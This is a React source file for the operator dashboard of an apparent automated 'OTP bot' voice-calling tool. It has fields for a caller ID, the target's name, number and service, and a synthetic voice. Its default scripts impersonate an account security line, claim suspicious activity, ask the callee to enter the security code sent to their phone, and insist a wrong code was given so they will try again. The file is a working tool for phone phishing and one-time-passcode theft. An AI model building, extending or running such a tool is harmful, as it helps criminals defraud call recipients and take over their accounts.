import { useState, useEffect, useRef, useCallback } from "react";
import "@/App.css";
import axios from "axios";
import { motion, AnimatePresence } from "framer-motion";
import { 
  Phone, 
  PhoneOff, 
  Settings, 
  MessageSquare, 
  Layers, 
  Trash2,
  Volume2,
  User,
  Hash,
  Building,
  Play,
  RefreshCw
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { 
  Select, 
  SelectContent, 
  SelectItem, 
  SelectTrigger, 
  SelectValue 
} from "@/components/ui/select";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Toaster } from "@/components/ui/sonner";
import { toast } from "sonner";

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

// Voice models
const VOICE_MODELS = [
  { id: "hera", name: "Hera (Female, Mature)" },
  { id: "aria", name: "Aria (Female, Young)" },
  { id: "apollo", name: "Apollo (Male, Mature)" },
  { id: "zeus", name: "Zeus (Male, Deep)" },
];

// Call types
const CALL_TYPES = [
  { id: "login_verification", name: "Login Verification" },
  { id: "otp_delivery", name: "OTP Delivery" },
  { id: "appointment_reminder", name: "Appointment Reminder" },
  { id: "custom", name: "Custom Script" },
];

function App() {
  // Call configuration state
  const [callType, setCallType] = useState("login_verification");
  const [voiceModel, setVoiceModel] = useState("hera");
  const [fromNumber, setFromNumber] = useState("+18085821342");
  const [recipientNumber, setRecipientNumber] = useState("");
  const [recipientName, setRecipientName] = useState("");
  const [serviceName, setServiceName] = useState("");
  const [otpDigits, setOtpDigits] = useState("6");

  // Messages state
  const [greetings, setGreetings] = useState(
    "Hello {name}, This is the {service} account service prevention line. This automated call was made due to suspicious activity on your account."
  );
  const [prompt, setPrompt] = useState(
    "Thank you for your confirmation. Please enter the {digits}-digit security code that we sent to your phone number."
  );
  const [retryMessage, setRetryMessage] = useState(
    "Thank you for waiting. The verification code you entered previously is incorrect. Please make sure you enter the correct code."
  );
  const [endMessage, setEndMessage] = useState(
    "Thank you for waiting. We will get back to you if we need further information. Thank you for your attention. Goodbye."
  );

  // Call steps state
  const [activeStep, setActiveStep] = useState("rejected");
  const [stepMessages, setStepMessages] = useState({
    step1: "",
    step2: "",
    step3: "",
    accepted: "",
    rejected: retryMessage,
  });

  // Call state
  const [isCallActive, setIsCallActive] = useState(false);
  const [currentCallId, setCurrentCallId] = useState(null);
  const [callStatus, setCallStatus] = useState("IDLE");
  const [logs, setLogs] = useState([]);
  const [isLoading, setIsLoading] = useState(false);

  // Refs
  const logsEndRef = useRef(null);
  const eventSourceRef = useRef(null);

  // Auto-scroll logs
  useEffect(() => {
    logsEndRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [logs]);

  // Cleanup SSE on unmount
  useEffect(() => {
    return () => {
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
      }
    };
  }, []);

  // Subscribe to SSE events
  const subscribeToEvents = useCallback((callId) => {
    if (eventSourceRef.current) {
      eventSourceRef.current.close();
    }

    const eventSource = new EventSource(`${API}/calls/${callId}/events`);
    eventSourceRef.current = eventSource;

    eventSource.onmessage = (event) => {
      try {
        const data = JSON.parse(event.data);
        
        if (data.type === "heartbeat") return;
        
        if (data.type === "connected") {
          console.log("Connected to event stream");
          return;
        }

        // Add to logs
        setLogs((prev) => [...prev, data]);

        // Update call status based on event
        if (data.event_type) {
          const statusMap = {
            CALL_QUEUED: "PENDING",
            CALL_INITIATED: "CALLING",
            CALL_RINGING: "RINGING",
            CALL_ESTABLISHED: "ESTABLISHED",
            CALL_FINISHED: "FINISHED",
            CALL_FAILED: "FAILED",
            CALL_HANGUP: "FINISHED",
          };
          
          const newStatus = statusMap[data.event_type];
          if (newStatus) {
            setCallStatus(newStatus);
            
            // End call on finished/failed
            if (["FINISHED", "FAILED"].includes(newStatus)) {
              setIsCallActive(false);
              eventSource.close();
            }
          }
        }
      } catch (e) {
        console.error("Error parsing event:", e);
      }
    };

    eventSource.onerror = () => {
      console.error("SSE connection error");
      eventSource.close();
    };
  }, []);

  // Start call
  const handleStartCall = async () => {
    if (!recipientNumber) {
      toast.error("Please enter recipient number");
      return;
    }

    setIsLoading(true);
    
    try {
      const response = await axios.post(`${API}/calls/initiate`, {
        config: {
          call_type: callType,
          voice_model: VOICE_MODELS.find(v => v.id === voiceModel)?.name || voiceModel,
          from_number: fromNumber,
          recipient_number: recipientNumber,
          recipient_name: recipientName,
          service_name: serviceName,
          otp_digits: parseInt(otpDigits),
        },
        messages: {
          greetings: greetings.replace("{name}", recipientName).replace("{service}", serviceName),
          prompt: prompt.replace("{digits}", otpDigits),
          retry: retryMessage.replace("{digits}", otpDigits),
          end_message: endMessage,
        },
        steps: stepMessages,
      });

      const { call_id } = response.data;
      setCurrentCallId(call_id);
      setIsCallActive(true);
      setCallStatus("PENDING");
      
      // Subscribe to events
      subscribeToEvents(call_id);
      
      toast.success("Call initiated successfully");
    } catch (error) {
      console.error("Error starting call:", error);
      toast.error(error.response?.data?.detail || "Failed to start call");
    } finally {
      setIsLoading(false);
    }
  };

  // Hang up call
  const handleHangUp = async () => {
    if (!currentCallId) return;
    
    setIsLoading(true);
    
    try {
      await axios.post(`${API}/calls/${currentCallId}/hangup`);
      setIsCallActive(false);
      setCallStatus("FINISHED");
      
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
      }
      
      toast.success("Call terminated");
    } catch (error) {
      console.error("Error hanging up:", error);
      toast.error(error.response?.data?.detail || "Failed to hang up");
    } finally {
      setIsLoading(false);
    }
  };

  // Clear logs
  const handleClearLogs = () => {
    setLogs([]);
    toast.success("Logs cleared");
  };

  // Format timestamp
  const formatTimestamp = (isoString) => {
    const date = new Date(isoString);
    return date.toLocaleTimeString("en-US", {
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: false,
    });
  };

  // Get status color class
  const getStatusClass = (status) => {
    const classes = {
      IDLE: "status-pending",
      PENDING: "status-pending",
      CALLING: "status-calling",
      RINGING: "status-ringing",
      ESTABLISHED: "status-established",
      FINISHED: "status-finished",
      FAILED: "status-failed",
    };
    return classes[status] || "status-pending";
  };

  return (
    <div className="app-container" data-testid="app-container">
      <Toaster theme="dark" position="top-right" />
      
      <div className="main-grid">
        {/* Left Panel - Bot Logs */}
        <div className="logs-panel glass-panel" data-testid="logs-panel">
          <div className="logs-header">
            <div className="flex items-center gap-3">
              <div className={`status-indicator ${getStatusClass(callStatus)}`} data-testid="status-indicator" />
              <h2 className="font-heading text-xl font-semibold text-white">
                Bot Logs
              </h2>
              <span className="font-mono text-xs text-slate-500 uppercase">
                {callStatus}
              </span>
            </div>
            <Button
              variant="ghost"
              size="sm"
              onClick={handleClearLogs}
              className="text-slate-400 hover:text-white hover:bg-white/5"
              data-testid="clear-logs-btn"
            >
              <Trash2 className="w-4 h-4 mr-2" />
              Clear
            </Button>
          </div>
          
          <div className="logs-container scanlines" data-testid="logs-container">
            <AnimatePresence>
              {logs.length === 0 ? (
                <div className="text-center text-slate-600 font-mono text-sm py-8">
                  No logs yet. Start a call to see events.
                </div>
              ) : (
                logs.map((log, index) => (
                  <motion.div
                    key={`${log.timestamp}-${index}`}
                    initial={{ opacity: 0, x: -10 }}
                    animate={{ opacity: 1, x: 0 }}
                    exit={{ opacity: 0 }}
                    className="log-entry"
                    data-testid={`log-entry-${index}`}
                  >
                    <div className="log-timestamp">
                      [{formatTimestamp(log.timestamp)}]
                    </div>
                    <div className="log-event neon-text">
                      {log.event_type}
                    </div>
                    <div className="log-details">
                      {log.details}
                    </div>
                  </motion.div>
                ))
              )}
            </AnimatePresence>
            <div ref={logsEndRef} />
          </div>
        </div>

        {/* Right Panel - Call Setup */}
        <div className="setup-panel" data-testid="setup-panel">
          {/* Call Configuration */}
          <div className="form-section glass-panel p-6 rounded-xl mb-6" data-testid="call-config-section">
            <h3 className="section-title">
              <Settings className="w-5 h-5" />
              Call Configuration
            </h3>
            
            <div className="form-grid">
              <div>
                <label className="form-label">Call Type</label>
                <div className="flex gap-2">
                  <Select value={callType} onValueChange={setCallType}>
                    <SelectTrigger className="glass-input h-12 font-mono text-cyan-100" data-testid="call-type-select">
                      <SelectValue />
                    </SelectTrigger>
                    <SelectContent className="bg-slate-900 border-slate-800">
                      {CALL_TYPES.map((type) => (
                        <SelectItem 
                          key={type.id} 
                          value={type.id}
                          className="font-mono text-sm"
                        >
                          {type.name}
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                </div>
              </div>
              
              <div>
                <label className="form-label">Voice Model</label>
                <Select value={voiceModel} onValueChange={setVoiceModel}>
                  <SelectTrigger className="glass-input h-12 font-mono text-cyan-100" data-testid="voice-model-select">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="bg-slate-900 border-slate-800">
                    {VOICE_MODELS.map((model) => (
                      <SelectItem 
                        key={model.id} 
                        value={model.id}
                        className="font-mono text-sm"
                      >
                        {model.name}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              <div>
                <label className="form-label flex items-center gap-2">
                  <Phone className="w-3 h-3" />
                  Caller ID / From Number
                </label>
                <Input
                  type="text"
                  value={fromNumber}
                  onChange={(e) => setFromNumber(e.target.value)}
                  className="glass-input h-12 font-mono text-cyan-100"
                  placeholder="+18085821342"
                  data-testid="from-number-input"
                />
              </div>
              
              <div>
                <label className="form-label flex items-center gap-2">
                  <User className="w-3 h-3" />
                  Recipient Name
                </label>
                <Input
                  type="text"
                  value={recipientName}
                  onChange={(e) => setRecipientName(e.target.value)}
                  className="glass-input h-12 font-mono text-cyan-100"
                  placeholder="John Doe"
                  data-testid="recipient-name-input"
                />
              </div>
              
              <div>
                <label className="form-label flex items-center gap-2">
                  <Phone className="w-3 h-3" />
                  Recipient Number
                </label>
                <Input
                  type="text"
                  value={recipientNumber}
                  onChange={(e) => setRecipientNumber(e.target.value)}
                  className="glass-input h-12 font-mono text-cyan-100"
                  placeholder="+14155552671"
                  data-testid="recipient-number-input"
                />
              </div>
              
              <div>
                <label className="form-label flex items-center gap-2">
                  <Building className="w-3 h-3" />
                  Service Name
                </label>
                <Input
                  type="text"
                  value={serviceName}
                  onChange={(e) => setServiceName(e.target.value)}
                  className="glass-input h-12 font-mono text-cyan-100"
                  placeholder="MyCompany"
                  data-testid="service-name-input"
                />
              </div>
              
              <div>
                <label className="form-label flex items-center gap-2">
                  <Hash className="w-3 h-3" />
                  OTP Digits
                </label>
                <Select value={otpDigits} onValueChange={setOtpDigits}>
                  <SelectTrigger className="glass-input h-12 font-mono text-cyan-100" data-testid="otp-digits-select">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="bg-slate-900 border-slate-800">
                    {[4, 5, 6, 7, 8].map((num) => (
                      <SelectItem 
                        key={num} 
                        value={num.toString()}
                        className="font-mono text-sm"
                      >
                        {num}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              <div className="flex items-end">
                <Button 
                  variant="outline"
                  className="w-full h-12 glass-input border-cyan-500/30 text-cyan-400 hover:bg-cyan-500/10 font-mono text-xs uppercase tracking-wider"
                  data-testid="preview-voice-btn"
                >
                  <Volume2 className="w-4 h-4 mr-2" />
                  Preview Voice
                </Button>
              </div>
            </div>
          </div>

          {/* Messages Section */}
          <div className="form-section glass-panel p-6 rounded-xl mb-6" data-testid="messages-section">
            <h3 className="section-title">
              <MessageSquare className="w-5 h-5" />
              Message Scripts
            </h3>
            
            <div className="space-y-4">
              <div>
                <label className="form-label">Greetings</label>
                <Textarea
                  value={greetings}
                  onChange={(e) => setGreetings(e.target.value)}
                  className="glass-input form-textarea font-mono text-cyan-100"
                  placeholder="Hello {name}, This is..."
                  data-testid="greetings-textarea"
                />
              </div>
              
              <div>
                <label className="form-label">Prompt</label>
                <Textarea
                  value={prompt}
                  onChange={(e) => setPrompt(e.target.value)}
                  className="glass-input form-textarea font-mono text-cyan-100"
                  placeholder="Please enter the {digits}-digit code..."
                  data-testid="prompt-textarea"
                />
              </div>
              
              <div>
                <label className="form-label">Retry Message</label>
                <Textarea
                  value={retryMessage}
                  onChange={(e) => setRetryMessage(e.target.value)}
                  className="glass-input form-textarea font-mono text-cyan-100"
                  placeholder="The code you entered is incorrect..."
                  data-testid="retry-textarea"
                />
              </div>
              
              <div>
                <label className="form-label">End Message</label>
                <Textarea
                  value={endMessage}
                  onChange={(e) => setEndMessage(e.target.value)}
                  className="glass-input form-textarea font-mono text-cyan-100"
                  placeholder="Thank you for your time. Goodbye."
                  data-testid="end-message-textarea"
                />
              </div>
            </div>
          </div>

          {/* Call Steps Configuration */}
          <div className="form-section glass-panel p-6 rounded-xl mb-6" data-testid="call-steps-section">
            <h3 className="section-title">
              <Layers className="w-5 h-5" />
              Call Steps Configuration
            </h3>
            
            <Tabs value={activeStep} onValueChange={setActiveStep} className="w-full">
              <TabsList className="w-full bg-black/40 border border-white/5 p-1 rounded-lg" data-testid="call-steps-tabs">
                {["step1", "step2", "step3", "accepted", "rejected"].map((step) => (
                  <TabsTrigger
                    key={step}
                    value={step}
                    className="flex-1 data-[state=active]:bg-cyan-500/10 data-[state=active]:text-cyan-400 data-[state=active]:border-cyan-500/30 border border-transparent font-mono text-xs uppercase tracking-wider"
                    data-testid={`step-tab-${step}`}
                  >
                    {step === "accepted" ? "Accepted" : step === "rejected" ? "Rejected" : `Step ${step.slice(-1)}`}
                  </TabsTrigger>
                ))}
              </TabsList>
              
              {["step1", "step2", "step3", "accepted", "rejected"].map((step) => (
                <TabsContent key={step} value={step} className="mt-4">
                  <label className="form-label">
                    {step === "rejected" ? "Rejected Message" : step === "accepted" ? "Accepted Message" : `Step ${step.slice(-1)} Message`}
                  </label>
                  <Textarea
                    value={stepMessages[step]}
                    onChange={(e) => setStepMessages({ ...stepMessages, [step]: e.target.value })}
                    className="glass-input form-textarea font-mono text-cyan-100"
                    placeholder={`Enter message for ${step}...`}
                    data-testid={`step-message-${step}`}
                  />
                </TabsContent>
              ))}
            </Tabs>
          </div>

          {/* Call Button */}
          <motion.div
            whileHover={{ scale: 1.02 }}
            whileTap={{ scale: 0.98 }}
          >
            {!isCallActive ? (
              <button
                onClick={handleStartCall}
                disabled={isLoading || !recipientNumber}
                className={`call-button call-button-start btn-primary ${isLoading ? 'opacity-50' : ''}`}
                data-testid="start-call-btn"
              >
                {isLoading ? (
                  <RefreshCw className="w-5 h-5 animate-spin" />
                ) : (
                  <Play className="w-5 h-5" />
                )}
                {isLoading ? "Initiating..." : "Start Call"}
              </button>
            ) : (
              <button
                onClick={handleHangUp}
                disabled={isLoading}
                className={`call-button call-button-stop ${isLoading ? 'opacity-50' : ''}`}
                data-testid="hangup-btn"
              >
                {isLoading ? (
                  <RefreshCw className="w-5 h-5 animate-spin" />
                ) : (
                  <PhoneOff className="w-5 h-5" />
                )}
                {isLoading ? "Terminating..." : "Hang Up"}
              </button>
            )}
          </motion.div>
        </div>
      </div>
    </div>
  );
}

export default App;
